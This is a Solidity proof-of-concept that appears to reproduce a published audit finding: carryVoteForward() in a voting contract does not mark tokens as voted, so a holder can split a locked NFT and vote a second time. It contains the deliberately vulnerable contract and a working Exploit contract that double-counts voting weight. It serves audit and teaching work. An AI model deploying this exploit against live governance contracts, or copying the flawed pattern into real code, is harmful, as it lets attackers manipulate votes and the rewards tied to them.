// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of finding 61950 (C-01):
// "`carryVoteForward()` enables double voting".
//
// Source (Pashov Audit Group), Voter contract. `carryVoteForward()` is
// reproduced VERBATIM (marked @> on the `_vote(nextPeriod, ...)` call). The
// EnumerableSet `tokenIdVotedList` is a faithful array double (`.values()`).
//
// Root cause: `carryVoteForward()` re-casts the previous period's votes into the
// next period via `_vote()` but NEVER sets `period[nextPeriod].voted[_tokenId] =
// true`. So `checkPeriodVoted(nextPeriod)` returns false, bypassing the
// `notVoted` guard that gates `split()`/`merge()`/`_update()` in VotingEscrow.
// A voter carries their vote forward, splits the (supposedly locked-in) NFT, and
// votes AGAIN with the new NFT in the same period — double-counting their weight.
// ─────────────────────────────────────────────────────────────────────────────

interface IVoter {
    function checkPeriodVoted(uint256 period, uint256 tokenId) external view returns (bool);
    function getCurrentPeriod() external view returns (uint256);
}

/// @dev Faithful marker token used to record the double-counted voting weight.
contract MiniToken {
    string public name = "DOUBLE-VOTE";
    string public symbol = "dVOTE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `carryVoteForward()` is reproduced VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract Voter is IVoter {
    struct Period {
        mapping(uint256 => bool) voted;                               // voted[tokenId]
        mapping(uint256 => address[]) tokenIdVotedList;               // pools a token voted for (EnumerableSet double)
        mapping(address => mapping(uint256 => uint256)) tokenIdVotes; // [gauge][tokenId] => weight
        mapping(address => uint256) gaugeTotalVotes;                  // total weight per gauge
    }
    mapping(uint256 => Period) internal period;
    mapping(address => address) public gauge; // pool => gauge (simplified gauge[pool].gauge)
    uint256 public currentPeriod;

    function getCurrentPeriod() public view returns (uint256) { return currentPeriod; }
    function checkPeriodVoted(uint256 p, uint256 tokenId) external view returns (bool) { return period[p].voted[tokenId]; }
    function gaugeVotes(uint256 p, address g) external view returns (uint256) { return period[p].gaugeTotalVotes[g]; }
    function setGauge(address pool, address g) external { gauge[pool] = g; }

    function _vote(uint256 p, uint256 _tokenId, address[] memory pools, uint256[] memory weights) internal {
        Period storage ps = period[p];
        for (uint256 i; i < pools.length; i++) {
            address g = gauge[pools[i]];
            ps.tokenIdVotedList[_tokenId].push(pools[i]);
            ps.tokenIdVotes[g][_tokenId] = weights[i];
            ps.gaugeTotalVotes[g] += weights[i];
        }
    }

    /// @notice Normal vote path — CORRECTLY marks the token as voted.
    function vote(uint256 _tokenId, address[] calldata pools, uint256[] calldata weights) external {
        uint256 nextPeriod = getCurrentPeriod() + 1;
        _vote(nextPeriod, _tokenId, pools, weights);
        period[nextPeriod].voted[_tokenId] = true; // the guard the vulnerable path omits
    }

    /// @notice Seed a token's vote in `_fromPeriod` so it has something to carry forward.
    function seedFromPeriod(uint256 _fromPeriod, uint256 _tokenId, address pool, uint256 weight) external {
        Period storage ps = period[_fromPeriod];
        ps.tokenIdVotedList[_tokenId].push(pool);
        ps.tokenIdVotes[gauge[pool]][_tokenId] = weight;
    }

    // ── VERBATIM carryVoteForward from the audited source ──
    function carryVoteForward(uint256 _tokenId, uint256 _fromPeriod) public {
        Period storage ps = period[_fromPeriod];
        uint256 nextPeriod = getCurrentPeriod() + 1;

        // fetch weights from previous period
        address[] memory _poolList = ps.tokenIdVotedList[_tokenId];
        uint256[] memory _weightList = new uint256[](_poolList.length);

        for (uint256 i; i < _poolList.length; i++) {
            address _gauge = gauge[_poolList[i]];
            _weightList[i] = ps.tokenIdVotes[_gauge][_tokenId];
        }

        // deposit votes to next period
        _vote(nextPeriod, _tokenId, _poolList, _weightList); // @> VULN: casts votes for nextPeriod but never sets period[nextPeriod].voted[_tokenId]=true, so checkPeriodVoted stays false and the notVoted guard is bypassed
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VotingEscrow — the `notVoted` guard is bypassed because carryVoteForward never
// marked the token as voted, so split() succeeds mid-vote.
// ─────────────────────────────────────────────────────────────────────────────
contract VotingEscrow {
    address public immutable voter;
    uint256 public nextTokenId = 100;
    mapping(uint256 => uint256) public weightOf;

    constructor(address _voter) { voter = _voter; }

    modifier notVoted(uint256 _tokenId) {
        if (IVoter(voter).checkPeriodVoted(IVoter(voter).getCurrentPeriod() + 1, _tokenId) == true) revert("Voted");
        _;
    }

    function mint(uint256 weight) external returns (uint256 id) { id = nextTokenId++; weightOf[id] = weight; }

    /// @notice Splitting mid-vote must be blocked by `notVoted` — the bug lets it through.
    function split(uint256 _tokenId) external notVoted(_tokenId) returns (uint256 id) {
        id = nextTokenId++;
        weightOf[id] = weightOf[_tokenId]; // new NFT keeps the full voting weight
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: carry a vote forward (weight W), split the still-"unvoted" NFT
// into a fresh NFT (weight W), then vote AGAIN with it — the gauge records 2W
// from a single W of real voting power.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant W = 100e18;

    MiniToken public marker;  // child nonce 1
    Voter public vuln;        // child nonce 2 (VULN)
    VotingEscrow public ve;   // child nonce 3

    address public pool = address(0xdEAD);
    address public gaugeAddr = address(0xBEEF);

    uint256 public gaugeVotesAfter;
    uint256 public doubleCounted;

    constructor() {
        marker = new MiniToken();          // nonce 1
        vuln = new Voter();                // nonce 2
        ve = new VotingEscrow(address(vuln)); // nonce 3
    }

    function run() external {
        vuln.setGauge(pool, gaugeAddr);
        uint256 tokenId = ve.mint(W);
        // token voted with weight W in the previous period
        vuln.seedFromPeriod(0, tokenId, pool, W);

        // 1) carry the vote forward into nextPeriod — but voted[tokenId] stays false
        vuln.carryVoteForward(tokenId, 0);
        require(!vuln.checkPeriodVoted(1, tokenId), "unexpectedly marked voted");

        // 2) split the NFT even though it has an active vote (notVoted bypassed)
        uint256 tokenId2 = ve.split(tokenId);

        // 3) vote AGAIN in the same period with the new NFT
        address[] memory pools = new address[](1); pools[0] = pool;
        uint256[] memory weights = new uint256[](1); weights[0] = W;
        vuln.vote(tokenId2, pools, weights);

        gaugeVotesAfter = vuln.gaugeVotes(1, gaugeAddr);
        // harm: the gauge counted 2W from a single W of voting power
        require(gaugeVotesAfter == 2 * W, "double vote not registered");
        doubleCounted = gaugeVotesAfter - W;

        marker.mint(SINK, doubleCounted); // record the double-counted weight
    }
}
